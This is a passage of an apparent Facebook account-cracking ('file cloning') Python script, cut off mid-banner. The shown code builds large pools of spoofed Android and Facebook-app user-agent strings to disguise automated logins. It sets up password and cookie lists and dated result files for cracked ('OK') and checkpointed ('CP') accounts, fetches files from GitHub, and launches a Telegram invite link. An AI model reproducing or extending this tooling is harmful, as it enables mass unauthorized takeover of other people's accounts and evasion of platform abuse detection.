rmx = random.choice(['RMX1603', 'RMX1801', 'RMX1805', 'RMX1807', 'RMX1809', 'RMX1811', 'RMX1821', 'RMX1825', 'RMX1827', 'RMX1831', 'RMX1833', 'RMX1851', 'RMX1901', 'RMX1903', 'RMX1911', 'RMX1919', 'RMX1921', 'RMX1925', 'RMX1931', 'RMX1941', 'RMX1945', 'RMX1971', 'RMX1991', 'RMX1992', 'RMX1993', 'RMX2001', 'RMX2002', 'RMX2002', 'RMX2002', 'RMX2020', 'RMX2020', 'RMX2021', 'RMX2025', 'RMX2027', 'RMX2027', 'RMX2030', 'RMX2032', 'RMX2040', 'RMX2040', 'RMX2050', 'RMX2051', 'RMX2061', 'RMX2063', 'RMX2071', 'RMX2072', 'RMX2075', 'RMX2076', 'RMX2081', 'RMX2083', 'RMX2085', 'RMX2086', 'RMX2101', 'RMX2103', 'RMX2111', 'RMX2111', 'RMX2117', 'RMX2121', 'RMX2142', 'RMX2144', 'RMX2151', 'RMX2155', 'RMX2156', 'RMX2161', 'RMX2163', 'RMX2170', 'RMX2176', 'RMX2180', 'RMX2185', 'RMX2189', 'RMX2193', 'RMX2195', 'RMX2202', 'RMX3031', 'RMX3061', 'RMX3063', 'RMX3081', 'RMX3085', 'RMX3092', 'RMX3171', 'RMX3191', 'RMX3193', 'RMX3195', 'RMX3197', 'RMX3201', 'RMX3231', 'RMX3241', 'RMX3242'])
net = random.choice(['281', '282', '283', '284', '285', '286', '287', '288', '289', '290', '291', '292', '293', '382', '383', '370', '394', '301', '310', '311', '319', '350', '378', '360', '344'])
noti = random.choice(['9', '10', '11', '12'])
mmn = random.choice(['LM-V510N', 'SM-G970F', 'SM-A107M', 'OnePlus BE2015', 'OnePlus BE2025', 'OnePlus BE2028', 'HUAWEI MAR-LX1M', 'Pixel 3', 'SM-G996U', 'SM-G980F', 'SM-G960U', 'HUAWEI MAR-LX1A', 'CP3503L', 'Coolpad 2039', 'SM-A025G', 'SM-J610FN', 'LG-D802', 'LG L40', 'LMK200Z', 'LMK200E', 'LMK200B', 'LM-K200'])
hwi = random.choice(['YAL-L21', 'ELE-L04', 'LYA-L29', 'ELE-L29', 'VOG-L09', 'MAR-LX1B', 'HLK-AL00', 'JNY-LX2', 'MAR-LX3A'])
gts = random.choice(['AD9', 'AD8', 'LG7n', 'LG8n', 'LG6n', 'KG5p', 'CI7n', 'CI8', 'CI8n', 'CI6n', 'CH6i'])
tco = random.choice(['RB8S', 'KC8S', 'KC6', 'KC2', 'CC7', 'CB7'])
bio = random.choice(['SM-G6100', 'SM-G610L', 'SM-G610K', 'SM-G615F', 'SM-G615FU', 'SM-J730G', 'SM-J730GM', 'SM-G9298', 'SM-G615F, SM-G615FU', 'SM-C7010', 'SM-C701F', 'SM-C7018', 'SM-J710FN', 'SM-A520F', 'SM-A520F', 'SM-A520K', 'SM-A520L', 'SM-A520S', 'SM-A520W', 'SM-A720F', 'SM-A720S', 'SM-C5010', 'SM-C5018', 'SM-C9000', 'SM-C900F', 'SM-C9008', 'SM-C900Y', 'SM-A8100', 'SM-A810F', 'SM-A810F', 'SM-A810YZ', 'SM-A810S', 'SM-J111F', 'SM-J110G', 'SM-J110F', 'SM-J110H', 'SM-J110M', 'SM-J110L', 'SM-J111M', 'SM-J105F', 'SM-j105H', 'SM-J105H', 'SM-J105B', 'SM-J105Y', 'SM-J105M', 'SM-G388F', 'R3', 'SM-J106F', 'SM-J106B', 'SM-J106H', 'SM-J106M', 'SM-J701F', 'SM-J701F', 'SM-J701M', 'SM-J701MT', 'SO-02H', 'E5823', 'E5803', 'SM-J720F', 'SM-J720F/DS', 'SM-J720M', 'SM-J720M/DS', 'X00ID', 'X00IS', 'X00HDA', 'ZC554KL', 'XT1766', 'XT1763', 'G3116', 'G3121', 'G3112', 'G3123', 'G3125', 'SM-A605FN', 'SM-A605G', 'SM-A605F', 'SM-A605GN', 'SM-A6050', 'SM-A605K', 'SM-A605X', 'SM-A6058', 'SM-A750F', 'SM-A750FN', 'SM-A750G', 'SM-A750GN', 'SM-A750C', 'SM-A750X', 'SM-A750N', 'SM-G885F', 'SM-G8850', 'SM-G885Y', 'SM-G885S', 'SM-G8858', 'SM-J111F', 'SM-J110G', 'SM-J110F', 'SM-J110H', 'SM-J110M', 'SM-J110L', 'SM-J111M', 'SM-J105F', 'SM-j105H', 'SM-J105H', 'SM-J105B', 'SM-J105Y', 'SM-J105M', 'SM-G388F', 'R3', 'SM-J106F', 'SM-J106B', 'SM-J106H', 'SM-J106M', 'SM-J250F', 'SM-J250G', 'SM-J250F', 'SM-J250M', 'SM-J250Y', 'SM-A260F', 'SM-A260G', 'SM-G532F', 'SM-G532G', 'SM-G532M', 'SM-G532G', 'SM-G532F', 'SM-G532MT', 'MT7-TL00', 'MT7-L09', 'MT7-TL10', 'MT7-CL00', 'MT7-UL00', 'PRA-TL10', 'PRA-TL20', 'PRA-LA1', 'PRA-LX1', 'PRA-LX2', 'TAG-L21', 'PRA-AL00X', 'TAG-L32', 'PRA-LX3', 'PRA-AL00', 'EVA-L09', 'EVA-L19', 'EVA-L29', 'EVA-AL10', 'EVA-TL00', 'EVA-AL00', 'EVA-DL00', 'SLA-L02', 'SLA-L22', 'SLA-L03', 'SLA-L23', 'WAS-LX1', 'WAS-LX2', 'WAS-LX3', 'WAS-LX1A', 'WAS-LX2J', 'WAS-L03T', 'WAS-AL00', 'WAS-TL10', 'POT-LX1', 'POT-LX1AF', 'POT-LX2J', 'POT-LX1RUA', 'POT-LX3', 'HMA-L09', 'HMA-LX9', 'HMA-L29', 'HMA-AL00', 'HMA-TL00', 'LIO-L09', 'LIO-L29', 'LIO-AL00', 'LIO-TL00', 'MYA-L03', 'MYA-L23', 'MYA-L02, MYA-L22', 'MYA-U29', 'MYA-L13', 'DUB-LX1', 'DUB-LX3', 'DUB-LX1'])
mui = random.choice(['M2004J19G', 'M2004J19C'])
red = random.choice(['M1803E6G', 'M1803E6H', 'M1803E6I', 'M1803E7SG', 'M1803E7SH', 'M1804C3DG', 'M1804C3DH', 'M1804C3DI', 'M1806E7TG', 'M1806E7TH', 'M1806E7TI', 'M2004J19G', 'M2004J19C'])
bik = random.choice(['X017DA', 'X018D', 'A009', 'X00LD', 'X015D', 'Z01KS', 'Z01MDA', 'ASUS_X00KD', 'ASUS_A002A', 'ASUS_X013'])
inf = random.choice(['X682B', 'X682C', 'X680B', 'X688B'])
inform = random.choice(['PR652B', 'X267', 'X5010', 'X521', 'X5514D', 'X5515', 'X5515F', 'X559', 'X559C', 'X559F', 'X571', 'X572', 'X573', 'X573B', 'X601', 'X603', 'X604', 'X604B', 'X605', 'X606', 'X606B', 'X606C', 'X606D', 'X608', 'X609', 'X610', 'X610B', 'X612', 'X612B', 'X620', 'X620B', 'X622', 'X623', 'X623B', 'X624', 'X624B', 'X625', 'X625B', 'X625D', 'X626', 'X626B', 'X627V', 'X650', 'X650B', 'X650C', 'X650D', 'X652', 'X652A', 'X652B', 'X652C', 'X653', 'X653C', 'X655', 'X655C', 'X655D', 'X655F', 'X656', 'X657', 'X657B', 'X657C', 'X659B', 'X660', 'X660B', 'X660C', 'X680', 'X680B', 'X680C', 'X682B', 'X682C', 'X683', 'X687', 'X687B', 'X688B', 'X688C', 'X688C', 'X689', 'X689B', 'X689C', 'X690', 'X690B', 'X692', 'X693', 'X695', 'X695C'])
fbbv = str(random.randint(111111111, 999999999))
fbav = f'{random.randint(111, 999)}.0.0.{random.randint(11, 99)}.{random.randint(111, 999)}'
uazz = f'[FBAN/MobileAdsManagerAndroid;FBAV/{net}.0.0.21.117;FBPN/com.facebook.adsmanager;FBLC/en_US;FBBV/{fbbv};FBCR/null;FBMF/TECNO;FBBD/TECNO;FBDV/{poc};FBSV/12;FBCA/arm64-v8a;FBDM/{{density=2.75,width=1080,height=2216}};FBOP/1;]'
ugm = '[FBAN/FB4A;FBAV/' + net + '.0.0.77.46;FBBV/251145743;FBDM/{density=2.625,width=1080,height=1920};FBLC/pt_BR;FBRV/' + str(random.randint(0, 999999999)) + ';FBCR/Zong;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/' + zov + ';FBSV/11;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
try:
    prox = requests.get('https://github.com/saedhasan7840/SAED-V7.3.py/blob/main/NEW-V7.3.py').text
    open('.prox.txt', 'w').write(prox)
except Exception:
    pass

ugen2 = []
ugen = []
cokbrut = []
ses = requests.Session()
prinCP = []
try:
    prox = open('.prox.txt', 'r').read().splitlines()
except:
    pass
for xd in range(10000):
    a = 'Mozilla/5.0 (Symbian/3; Series60/'
    b = random.randrange(1, 9)
    c = random.randrange(1, 9)
    d = 'SamsungBrowser'
    e = random.randrange(100, 9999)
    f = 'NEO-AL00 Build/HUAWEINEO-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    g = random.randrange(1, 9)
    h = random.randrange(1, 4)
    i = random.randrange(1, 4)
    j = random.randrange(1, 4)
    k = 'Mobile Safari/537.36'
    uaku = f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}'
    ugen2.append(uaku)
    aa = 'Mozilla/5.0 (Linux; Android 12'
    b = random.choice(['6', '7', '8', '9', '10', '11', '12'])
    c = ' en-us; GT-'
    d = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e = random.randrange(1, 999)
    f = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g = 'ANG-AN00 Build/HUAWEIANG-AN00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h = random.randrange(73, 100)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 115)
    l = 'Mobile Safari/537.36'
    uaku2 = f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for xd in range(1000):
    a = 'Mozilla/5.0 (Linux; Android'
    b = random.choice(['4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14', '15', '16'])
    c = 'RMX3491 Build/RKQ1.211019.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d = random.randrange(10, 200)
    e = '0'
    f = random.randrange(1000, 8000)
    g = random.randrange(10, 200)
    h = 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/392.2.0.33.108;]'
    uaku2 = f'{a} {b};{c}{d}.{e}.{f}.{g} {h}'
    ugen.append(uaku2)
for ua in range(10000):
    a = 'Mozilla/5.0 (Symbian/55; Series60/'
    b = random.randrange(1, 9)
    c = random.randrange(1, 9)
    d = 'NokiaX7-00'
    e = random.randrange(100, 9999)
    f = '/021.004; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/'
    g = random.randrange(1, 9)
    h = random.randrange(1, 4)
    i = random.randrange(1, 4)
    j = random.randrange(1, 4)
    k = 'Mobile Safari/533.4'
    uaku = f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}'
    ugen2.append(uaku)
    aa = 'Mozilla/5.0 (Linux; Android 8.1.0)'
    b = random.choice(['6', '7', '8', '9', '10', '11', '12'])
    c = ' GT-S5830L'
    d = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e = random.randrange(1, 999)
    f = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h = random.randrange(73, 100)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Mobile Safari/537.36'
    uaku2 = f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for ua in range(1000):
    a = 'Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S5380D'
    b = random.randrange(100, 9999)
    c = random.randrange(100, 9999)
    d = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    f = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    h = random.randrange(1, 9)
    i = '; U; Bada/2.0; ru-ru) AppleWebKit/534.20 (KHTML, like Gecko) Dolfin/'
    j = random.randrange(1, 9)
    k = random.randrange(1, 9)
    l = 'Mobile HVGA SMM-MMS/1.2.0 OPN-B'
    uak = f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
for agent in range(10000):
    aa = 'Mozilla/5.0 (Linux; Android 6.0.1;'
    b = random.choice(['6', '7', '8', '9', '10', '11', '12'])
    c = 'en-us; 10; T-Mobile myTouch 3G Slide Build/'
    d = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e = random.randrange(1, 999)
    f = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
    h = random.randrange(73, 100)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Mobile Safari/533.1'
    fullagnt = f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(fullagnt)
for x in range(10000):
    aa = 'Mozilla/5.0 (Windows NT 6.1; WOW64)'
    b = random.choice(['4', '5', '6', '7', '8', '9', '10', '11', '12'])
    c = 'ASUS_I006D Build/RKQ1.201022.002'
    d = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e = random.randrange(1, 999)
    f = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g = 'AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.3'
    h = random.randrange(73, 100)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Mobile Safari/537.36 Sleipnir/3.5.28'
    uakua = f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uakua)
for xd in range(5000):
    a = 'Mozilla/5.0 (Linux; Android'
    b = random.choice(['4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14', '15', '16'])
    c = 'RMX3191 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome'
    d = random.randrange(10, 200)
    e = '0.4844.88 '
    f = random.randrange(1000, 8000)
    g = random.randrange(10, 200)
    h = 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/383.1.0.25.106;]'
    uaku2 = f'{a} {b};{c}{d}.{e}.{f}.{g} {h}'
    ugen.append(uaku2)
for xd in range(9000):
    a = 'Mozilla/5.0 (Linux; Android'
    b = random.choice(['4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14', '15', '16'])
    c = 'CPH2269 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d = random.randrange(10, 200)
    e = '0'
    f = random.randrange(1000, 8000)
    g = random.randrange(10, 200)
    h = 'Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/348.0.0.8.103;]'
    uaku2 = f'{a} {b};{c}{d}.{e}.{f}.{g} {h}'
    ugen.append(uaku2)
for xd in range(1000):
    a = 'Mozilla/5.0 (Linux; Android'
    b = random.choice(['4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14', '15', '16'])
    c = 'RMX3491 Build/RKQ1.211019.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d = random.randrange(10, 200)
    e = '0'
    f = random.randrange(1000, 8000)
    g = random.randrange(10, 200)
    h = 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/392.2.0.33.108;]'
    uaku2 = f'{a} {b};{c}{d}.{e}.{f}.{g} {h}'
    ugen.append(uaku2)
for ua in range(10000):
    a = 'Mozilla/5.0 (Symbian/55; Series60/'
    b = random.randrange(1, 9)
    c = random.randrange(1, 9)
    d = 'NokiaX7-00'
    e = random.randrange(100, 9999)
    f = '/021.004; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/'
    g = random.randrange(1, 9)
    h = random.randrange(1, 4)
    i = random.randrange(1, 4)
    j = random.randrange(1, 4)
    k = 'Mobile Safari/533.4'
    uaku = f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}'
    ugen2.append(uaku)
    aa = 'Mozilla/5.0 (Linux; Android 8.1.0)'
    b = random.choice(['6', '7', '8', '9', '10', '11', '12'])
    c = ' GT-S5830L'
    d = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e = random.randrange(1, 999)
    f = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h = random.randrange(73, 100)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Mobile Safari/537.36'
    uaku2 = f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for ua in range(1000):
    a = 'Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S5380D'
    b = random.randrange(100, 9999)
    c = random.randrange(100, 9999)
    d = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    f = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    h = random.randrange(1, 9)
    i = '; U; Bada/2.0; ru-ru) AppleWebKit/534.20 (KHTML, like Gecko) Dolfin/'
    j = random.randrange(1, 9)
    k = random.randrange(1, 9)
    l = 'Mobile HVGA SMM-MMS/1.2.0 OPN-B'
    uak = f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
for agent in range(10000):
    aa = 'Mozilla/5.0 (Linux; Android 6.0.1;'
    b = random.choice(['6', '7', '8', '9', '10', '11', '12'])
    c = 'en-us; 10; T-Mobile myTouch 3G Slide Build/'
    d = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e = random.randrange(1, 999)
    f = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
    h = random.randrange(73, 100)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Mobile Safari/533.1'
    fullagnt = f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(fullagnt)
for x in range(10000):
    aa = 'Mozilla/5.0 (Windows NT 6.1; WOW64)'
    b = random.choice(['4', '5', '6', '7', '8', '9', '10', '11', '12'])
    c = 'ASUS_I006D Build/RKQ1.201022.002'
    d = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e = random.randrange(1, 999)
    f = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g = 'AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.3'
    h = random.randrange(73, 100)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Mobile Safari/537.36 Sleipnir/3.5.28'
    uakua = f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uakua)
for agent in range(10000):
    aa = 'Mozilla/5.0 (Linux; Android 6.0.1;'
    b = random.choice(['6', '7', '8', '9', '10', '11', '12'])
    c = 'en-us; 10; T-Mobile myTouch 3G Slide Build/'
    d = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e = random.randrange(1, 999)
    f = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
    h = random.randrange(73, 100)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Mobile Safari/533.1'
    fullagnt = f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(fullagnt)

def uaku():
    try:
        ua = open('bbnew.txt', 'r').read().splitlines()
        for ub in ua:
            ugen.append(ub)
    except:
        a = requests.get('https://github.com/saedhasan7840/AK-FILE/blob/main/approval.txt').text
        ua = open('bbnew.txt', 'w')
        aa = re.findall('line">(.*?)<', str(a))
        for un in aa:
            ua.write(un + '\n')
        ua = open('bbnew.txt', 'r').read().splitlines()
id, id2, loop, ok, cp, akun, oprek, method, lisensiku, taplikasi, tokenku, uid, lisensikuni = [], [], 0, 0, 0, [], [], [], [], [], [], [], []
cokbrut = []
pwpluss, pwnya = [], []

# ------------[ COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[38;5;50m'
N = '\x1b[0m'
Z = '\x1b[1;30m'
sir = '\x1b[41m\x1b[1;97m'
x = '\x1b[m'  # DEFAULT
m = '\x1b[1;91m'  # RED
k = '\x1b[93m'  # KUNING
h = '\x1b[1;92m'  # HIJAU
hh = '\x1b[32m'  # HIJAU MUDA
u = '\x1b[95m'  # UNGU
kk = '\x1b[33m'  # KUNING MUDA
b = '\x1b[1;96m'  # BIRU
p = '\x1b[0;34m'  # BIRU MUDA
asu = random.choice([m, k, h, u, b])

#--------------------[ CONVERTER-BULAN ]--------------#
Z = '\x1b[0;90m'
M = '\x1b[38;5;196m'
H = '\x1b[38;5;46m'
K = '\x1b[38;5;226m'
B = '\x1b[38;5;44m'
U = '\x1b[0;95m'
O = '\x1b[0;96m'
P = '\x1b[38;5;231m'
J = '\x1b[38;5;208m'
A = '\x1b[38;5;248m'

#-----------------------[ RICH ] ----------------#
Z2 = '[#000000]'
M2 = '[#FF0000]'
H2 = '[#00FF00]'
K2 = '[#FFFF00]'
B2 = '[#00C8FF]'
U2 = '[#AF00FF]'
N2 = '[#FF00FF]'
O2 = '[#00FFFF]'
P2 = '[#FFFFFF]'
J2 = '[#FF8F00]'
A2 = '[#AAAAAA]'

#------------------[ BULAN ]-------------------#
dic = {
    '1': 'January', '2': 'February', '3': 'March', '4': 'April', '5': 'May', '6': 'June', '7': 'July', '8': 'August', '9': 'September', '10': 'October', '11': 'November', '12': 'December'
}
dic2 = {
    '01': 'January', '02': 'February', '03': 'March', '04': 'April', '05': 'May', '06': 'June', '07': 'July', '08': 'August', '09': 'September', '10': 'October', '11': 'November', '12': 'Devember'
}
tgl = datetime.datetime.now().day
bln = dic[str(datetime.datetime.now().month)]
thn = datetime.datetime.now().year
okc = 'OK-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
cpc = 'CP-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
date = str(tgl) + '/' + str(bln) + '/' + str(thn)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx - 12
    tag = 'PM'
else:
    a = ltx
    tag = 'AM'

def alvino_xy(u):
    for e in u + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.005)

def TUTULj(u):
    for e in u + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

def clear():
    os.system('clear')

def alvino_xy(u):
    for e in u + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.005)

def clear():
    os.system('clear')

def back():
    login()

def contact():
    os.system('xdg-open https://t.me/+LRlET_sIrUcxMTk1')
    back()

def linex():
    print('\x1b[1;37m')

def animation(u):
    for e in u + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

os.system('xdg-open https://t.me/+LRlET_sIrUcxMTk1')
os.system('xdg-open https://t.me/+LRlET_sIrUcxMTk1')
logo = '\n ╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\n ║\x1b[0;96m●▬▬▬▬▬๑👨‍💻Chor Kishoreganj Black het Hacker👨‍💻AK-SAED HASAN ๑▬▬▬▬▬▬●\x1b[0;91m║\n ╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\n   \n ░▒▓███████▓▒░░▒▓██████▓▒░░▒▓████████▓▒░▒▓███████▓▒░  \n░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ \n░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ \n ░▒▓██████▓▒░░▒▓████████▓▒░▒▓██████▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ \n       ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ \n       ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ \n░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓███████▓▒░  \n                                                      \n ╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\n ║\x1b[0;95m[<🕌Assalamualaikum"Mind It,\'KAlyan king fuck you>]\x1b[0;95m║\n ╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\n\x1b[1;31m==================================================\n[\x7f] SC SEND BY       :      KALYAN KING\n[\x7f] TOOLS        :     𝐅𝐈𝐋𝐄-𝐂𝐋𝐎𝐍𝐈𝐍𝐆\n[\x7f] TYPE         :      